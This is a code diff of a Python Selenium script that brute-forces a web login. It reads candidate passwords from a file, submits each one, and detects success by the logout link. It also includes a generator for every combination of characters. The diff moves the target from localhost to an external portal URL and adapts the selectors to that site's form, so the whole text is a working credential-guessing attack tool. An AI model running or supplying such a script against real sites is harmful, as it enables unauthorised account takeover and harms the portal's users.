@@ -2,6 +2,7 @@ from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 import itertools
 import os
+import time
 
 def every_combination(n):
     generator=itertools.combinations_with_replacement('abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\]^_`{|}~', n )
@@ -25,17 +26,20 @@ options.binary_location="C:\Program Files (x86)\Google\Chrome\Application\chrome
 chrome_driver=r"C:\Users\x1301\Desktop\chromedriver.exe"
 driver=webdriver.Chrome(chrome_driver,chrome_options=options)
 
-driver.get("http://localhost:9998")
-username=driver.find_element_by_id("username")
-username.send_keys(username_str)
+driver.get("https://ourportal.shohamc1.com/")
+login_botton=driver.find_element_by_link_text("Login").click()
+time.sleep(1)
 
+username=driver.find_element_by_css_selector("[type='email']")
+username.send_keys(username_str)
 
 for line in f.readlines():
     line=line.replace('\n','')
-    print(line)
-    password=driver.find_element_by_id("password")
+    #print(line)
+    password=driver.find_element_by_css_selector("[type='password']")
+    password.clear()
     password.send_keys(line)
-    driver.find_element_by_class_name("submit").click()
+    driver.find_element_by_css_selector("button").click()
     try:
         assert "menu-log-out" in driver.page_source
         print("Test failed, find password {} for the given username".format(line))
